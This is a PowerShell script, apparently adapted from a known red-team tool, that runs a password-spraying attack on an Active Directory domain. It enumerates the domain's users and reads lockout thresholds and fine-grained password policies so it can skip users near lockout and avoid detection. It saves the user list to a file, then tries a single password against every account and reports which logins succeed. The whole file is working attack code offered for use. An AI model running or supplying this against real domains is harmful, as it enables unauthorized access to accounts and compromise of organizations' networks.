function Test-ADAuthentication {
	Param(
		[Parameter(Mandatory)]
		[string]$User,
		[Parameter(Mandatory)]
		$Password,
		[Parameter(Mandatory = $false)]
		$Server,
		[Parameter(Mandatory)]
		[string]$Domain
	)
  
	Add-Type -AssemblyName System.DirectoryServices.AccountManagement
	
	$contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
	
	$argumentList = New-Object -TypeName "System.Collections.ArrayList"
	$null = $argumentList.Add($contextType)
	$null = $argumentList.Add($Domain)

	if($null -ne $Server){
		$argumentList.Add($Server)
	}
	
	$principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $argumentList -ErrorAction SilentlyContinue

	if ($null -eq $principalContext) {
		Write-Warning "$Domain\$User - AD Authentication failed"
	}
	
	if ($principalContext.ValidateCredentials($User, $Password)) {
		Write-Host -ForegroundColor green "$Domain\$User - AD Authentication OK"
	}
	else {
		Write-Warning "$Domain\$User - AD Authentication failed"
	}
}

function Get-DomUL
{

    param(
     [Parameter(Position = 0, Mandatory = $true)]
     [string]
     $Domain = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [switch]
     $RemoveDisabled,

     [Parameter(Position = 2, Mandatory = $false)]
     [switch]
     $RemovePotentialLockouts,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $Filter
    )

    try
    {
       
           
		$DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
		$DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
		$CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
       
    }
    catch
    {
        Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."
        break
    }

   
    $objDeDomain = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
    $AccountLockoutThresholds = @()
    $AccountLockoutThresholds += $objDeDomain.Properties.lockoutthreshold

    
    $behaviorversion = [int] $objDeDomain.Properties['msds-behavior-version'].item(0)
    if ($behaviorversion -ge 3)
    {
       
        Write-Host "[*] Current domain is compatible with Fine-Grained Password Policy."
        $ADSearcher = New-Object System.DirectoryServices.DirectorySearcher
        $ADSearcher.SearchRoot = $objDeDomain
        $ADSearcher.Filter = "(objectclass=msDS-PasswordSettings)"
        $PSOs = $ADSearcher.FindAll()

        if ( $PSOs.count -gt 0)
        {
            Write-Host -foregroundcolor "yellow" ("[*] A total of " + $PSOs.count + " Fine-Grained Password policies were found.`r`n")
            foreach($entry in $PSOs)
            {
                
                $PSOFineGrainedPolicy = $entry | Select-Object -ExpandProperty Properties
                $PSOPolicyName = $PSOFineGrainedPolicy.name
                $PSOLockoutThreshold = $PSOFineGrainedPolicy.'msds-lockoutthreshold'
                $PSOAppliesTo = $PSOFineGrainedPolicy.'msds-psoappliesto'
                $PSOMinPwdLength = $PSOFineGrainedPolicy.'msds-minimumpasswordlength'
                $AccountLockoutThresholds += $PSOLockoutThreshold

                Write-Host "[*] Fine-Grained Password Policy titled: $PSOPolicyName has a Lockout Threshold of $PSOLockoutThreshold attempts, minimum password length of $PSOMinPwdLength chars, and applies to $PSOAppliesTo.`r`n"
            }
        }
    }

    $observation_window = Get-Observ $CurrentDomain

    [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
    Write-Host -ForegroundColor "yellow" "[*] Creating a list of users..."

    if ($SmallestLockoutThreshold -eq "0")
    {
        Write-Host -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
    }
    else
    {
        Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SmallestLockoutThreshold login attempts."
    }

    $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
    $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
    $UserSearcher.SearchRoot = $DirEntry

    $UserSearcher.PropertiesToLoad.Add("samaccountname") > $Null
    $UserSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
    $UserSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null

    if ($RemoveDisabled)
    {
        Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
        $UserSearcher.filter =
            "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2)$Filter)"
    }
    else
    {
        $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user)$Filter)"
    }

    $UserSearcher.PropertiesToLoad.add("samaccountname") > $Null
    $UserSearcher.PropertiesToLoad.add("lockouttime") > $Null
    $UserSearcher.PropertiesToLoad.add("badpwdcount") > $Null
    $UserSearcher.PropertiesToLoad.add("badpasswordtime") > $Null

    $UserSearcher.PageSize = 1000
    $AllUserObjects = $UserSearcher.FindAll()
    Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllUserObjects.count + " total users found.")
    $UserListArray = [System.Collections.Generic.List[String]]::new()

    if ($RemovePotentialLockouts)
    {
        Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
        foreach ($user in $AllUserObjects)
        {
            # Getting bad password counts and lst bad password time for each user
            $badcount = $user.Properties.badpwdcount
            $samaccountname = $user.Properties.samaccountname
            try
            {
                $badpasswordtime = $user.Properties.badpasswordtime[0]
            }
            catch
            {
                continue
            }
            $currenttime = Get-Date
            $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
            $timedifference = ($currenttime - $lastbadpwd).TotalMinutes

            if ($badcount)
            {
                [int]$userbadcount = [convert]::ToInt32($badcount, 10)
                $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount
                if (($timedifference -gt $observation_window) -or ($attemptsuntillockout -gt 1))
                {
                    $UserListArray.Add($samaccountname)
                }
            }
        }
    }
    else
    {
        foreach ($user in $AllUserObjects)
        {
            $samaccountname = $user.Properties.samaccountname
            $UserListArray.Add($samaccountname)
        }
    }

	$fileN = $Domain + "_users.txt"
	
	foreach($line in $UserListArray) { Add-Content $fileN $line }
	
    Write-Host -foregroundcolor "green" ("[*] Creating a userlist containing " + $UserListArray.count + " users gathered from the current user's domain in file $fileN")
    return $UserListArray
}

function Get-Observ($DomainEntry)
{
    $DomainEntry = [ADSI]$DomainEntry
    $lockObserv_attr = $DomainEntry.Properties['lockoutObservationWindow']
    $observation_window = $DomainEntry.ConvertLargeIntegerToInt64($lockObserv_attr.Value) / -600000000
    return $observation_window
}

function Get-Spray(){
	
	 param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $Domain =  $env:USERDNSDOMAIN,
	 
	 [Parameter(Position = 1, Mandatory)]
     [string]
     $Password
	 )
	 
	Write-Host -foregroundcolor "blue" ("[*]Now brute forcing users using '$Password'...")

	 
	$fileN = $Domain + "_users.txt"
	
	if(Test-Path $fileN){
		# "ok"
		foreach($usr in Get-Content $fileN) {
			Test-ADAuthentication -User $usr -Password $Password -Domain $Domain
		}
	
	}
	#generate it 
	else{ 
		Get-DomUL -Domain $Domain 
		#recursive call
		Get-Spray -Domain $Domain -Password $Password
	}
	
	
	#check if users file exists
	
	
}

#Test-ADAuthentication -User toto -Password passXX

#Test-ADAuthentication -User toto -Password passXX -Server xxx.domain.com